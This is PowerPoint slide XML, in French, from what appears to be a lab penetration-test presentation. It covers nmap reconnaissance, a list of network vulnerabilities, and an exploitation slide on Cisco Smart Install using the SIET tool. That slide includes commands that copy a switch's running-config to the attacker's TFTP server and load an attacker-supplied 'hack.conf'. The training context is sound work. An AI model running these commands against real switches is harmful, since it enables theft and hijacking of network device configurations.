              <a:ext cx="8704970" cy="9583185"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
          </p:spPr>
        </p:pic>
      </p:grpSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1872066332" name="Titre 1"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ctrTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="5291668" y="812800"/>
            <a:ext cx="5367866" cy="130556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FR" sz="4400">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Reconnaissance et Énumération</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="2118178852" name="Sous-titre 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="subTitle" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="5283201" y="2601118"/>
            <a:ext cx="5376333" cy="2839561"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="92500" lnSpcReduction="10000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fr-FR" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Service découvert grâce à :</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fr-FR">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>nmap</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> -sn 192.168.70.0/24</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fr-FR">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>nmap</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>sV</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>sU</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> 192.168.70.25</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fr-FR">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>nmap</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>sV</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>sU</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> 192.168.70.26</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fr-FR">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>nmap</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>sV</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>sU</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> 192.168.70.125</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fr-FR">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>nmap</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> -p- -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>sV</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> 192.168.70.125</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fr-FR">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>nmap</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>sV</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>sU</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> 192.168.70.126</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr lang="fr-FR" sz="1800">
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="1974452658" name="Image 4" descr="Une image contenant texte, capture d’écran, menu&#10;&#10;Le contenu généré par l’IA peut être incorrect."/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId5"/>
          <a:srcRect l="0" t="9422" r="1" b="1"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1225311" y="812800"/>
            <a:ext cx="3531365" cy="4978400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350667814" name="Titre 1"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="228996" y="233952"/>
            <a:ext cx="6402842" cy="5405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5000" lnSpcReduction="20000"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fr-FR">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="JetBrains Mono Bold"/>
              </a:rPr>
              <a:t>Reconnaissance et énumération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>
            <a:lumMod val="95000"/>
            <a:lumOff val="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9130245" name="Rectangle 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="-1330331" y="577849"/>
            <a:ext cx="7935919" cy="68814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917643253" name="Groupe 3"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="4786639" y="-1210295"/>
            <a:ext cx="8704970" cy="9583185"/>
            <a:chOff x="4786639" y="-1210295"/>
            <a:chExt cx="8704970" cy="9583185"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:pic>
          <p:nvPicPr>
            <p:cNvPr id="5" name="Graphique 4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>
              <a:off x="4921107" y="-451085"/>
              <a:ext cx="8436036" cy="8436036"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
          </p:spPr>
        </p:pic>
        <p:pic>
          <p:nvPicPr>
            <p:cNvPr id="6" name="Graphique 5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 rot="2594715">
              <a:off x="4786639" y="-1210295"/>
              <a:ext cx="8704970" cy="9583185"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
          </p:spPr>
        </p:pic>
      </p:grpSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="137668817" name="Titre 1"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ctrTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1876424" y="1122363"/>
            <a:ext cx="8791575" cy="76739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fr-FR">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Liste des vulnérabilités :</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="767573702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876424" y="2108518"/>
            <a:ext cx="8791575" cy="3804602"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fr-FR">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Vulnérabilité 1 : Cisco Smart Install</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fr-FR">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Vulnérabilité 2 : Kerberos</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fr-FR">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Vulnérabilité 3 : DNS</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fr-FR">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Vulnérabilité 4 : Complexité des mots de passe équipements</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fr-FR">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Vulnérabilité 5 : HSRP</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fr-FR">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Vulnérabilité 6 : </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>NetBios</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR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>
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Vulnérabilité 7 : SMB</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="197510743" name="Titre 1"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="228996" y="233952"/>
            <a:ext cx="6402842" cy="5405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5000" lnSpcReduction="20000"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fr-FR">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="JetBrains Mono Bold"/>
              </a:rPr>
              <a:t>Reconnaissance et énumération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>
            <a:lumMod val="95000"/>
            <a:lumOff val="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8820529" name="Groupe 4"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="4786639" y="-1210295"/>
            <a:ext cx="8704970" cy="9583185"/>
            <a:chOff x="4786639" y="-1210295"/>
            <a:chExt cx="8704970" cy="9583185"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:pic>
          <p:nvPicPr>
            <p:cNvPr id="7" name="Graphique 6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>
              <a:off x="4921107" y="-451085"/>
              <a:ext cx="8436036" cy="8436036"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
          </p:spPr>
        </p:pic>
        <p:pic>
          <p:nvPicPr>
            <p:cNvPr id="8" name="Graphique 7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 rot="2594715">
              <a:off x="4786639" y="-1210295"/>
              <a:ext cx="8704970" cy="9583185"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
          </p:spPr>
        </p:pic>
      </p:grpSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1715212842" name="Titre 1"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ctrTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1663064" y="208439"/>
            <a:ext cx="9203056" cy="148367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fr-FR" b="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Exploitation 1 : [Cisco Smart Install]</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR">
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1111569383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868804" y="4404361"/>
            <a:ext cx="8791575" cy="206184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FR">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Exemple de </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>scipt</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>siet</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> : </a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fr-FR">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>c1 = 'copy </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>system:running-config</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> flash:/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>config.text</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>'</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fr-FR">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>c2 = 'copy flash:/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>config.text</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> tftp://' + </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>my_ip</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> + '/' + </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>current_ip</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> + '.conf'</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fr-FR">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>c3 = 'copy tftp://' + </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>my_ip</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> + '/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>hack.conf</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>system:running-config</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>'</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr lang="fr-FR">
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="348946475" name="Sous-titre 2"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1868804" y="1884600"/>
            <a:ext cx="8791575" cy="235211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l" defTabSz="914400" rtl="0">
              <a:lnSpc>
                <a:spcPct val="120000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1000"/>
              </a:spcBef>
              <a:buSzPct val="125000"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
              <a:defRPr sz="2000" cap="all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>
              <a:lnSpc>
                <a:spcPct val="120000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="500"/>
              </a:spcBef>
              <a:buSzPct val="125000"/>
              <a:buFont typeface="Arial"/>
              <a:buNone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>
              <a:lnSpc>
                <a:spcPct val="120000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="500"/>
              </a:spcBef>
              <a:buSzPct val="125000"/>
              <a:buFont typeface="Arial"/>
              <a:buNone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>
              <a:lnSpc>
                <a:spcPct val="120000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="500"/>
              </a:spcBef>
              <a:buSzPct val="125000"/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>
              <a:lnSpc>
                <a:spcPct val="120000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="500"/>
              </a:spcBef>
              <a:buSzPct val="125000"/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>
              <a:lnSpc>
                <a:spcPct val="120000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="500"/>
              </a:spcBef>
              <a:buSzPct val="125000"/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>
              <a:lnSpc>
                <a:spcPct val="120000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="500"/>
              </a:spcBef>
              <a:buSzPct val="125000"/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>
              <a:lnSpc>
                <a:spcPct val="120000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="500"/>
              </a:spcBef>
              <a:buSzPct val="125000"/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>
              <a:lnSpc>
                <a:spcPct val="120000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="500"/>
              </a:spcBef>
              <a:buSzPct val="125000"/>
              <a:buFont typeface="Arial"/>
              <a:buNone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b="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>SIET</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> est un script python disponible sur GitHub permettant d'</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" b="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>injecter des lignes de configuration</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> depuis une Debian (ou Kali).</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fr-FR">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Ce script permet plusieurs choses. Dans notre cas, il nous sert à : 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fr-FR">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Installer et lancer un serveur TFTP en local,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fr-FR">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Se faire passer pour un Directeur légitime auprès du commutateur,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fr-FR">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Envoyer des commandes.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>
            <a:lumMod val="95000"/>
            <a:lumOff val="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17106375" name="Groupe 3"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="4786639" y="-1210295"/>
            <a:ext cx="8704970" cy="9583185"/>
            <a:chOff x="4786639" y="-1210295"/>
            <a:chExt cx="8704970" cy="9583185"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:pic>
          <p:nvPicPr>
            <p:cNvPr id="5" name="Graphique 4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>
              <a:off x="4921107" y="-451085"/>
              <a:ext cx="8436036" cy="8436036"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
          </p:spPr>
        </p:pic>
        <p:pic>
          <p:nvPicPr>
            <p:cNvPr id="6" name="Graphique 5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 rot="2594715">
              <a:off x="4786639" y="-1210295"/>
              <a:ext cx="8704970" cy="9583185"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
          </p:spPr>
        </p:pic>
      </p:grpSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1995265701" name="Titre 1"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ctrTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1876424" y="695643"/>
            <a:ext cx="9203056" cy="90455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fr-FR" b="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Exploitation 2 : [DNS]</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR">
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="985315730" name="Sous-titr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876423" y="1902135"/>
            <a:ext cx="8791574" cy="4639129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85000" lnSpcReduction="3000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fr-FR">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Etape 1 : </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>nmap</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>sV</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> -p 53 192.168.70.25 (puis 192.168.70.26)</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr>
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Résultat</a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> : groupe10.test pour windows</a:t>
            </a:r>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr>
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Pellet-SA.local pour linux debian</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr lang="fr-FR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>
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
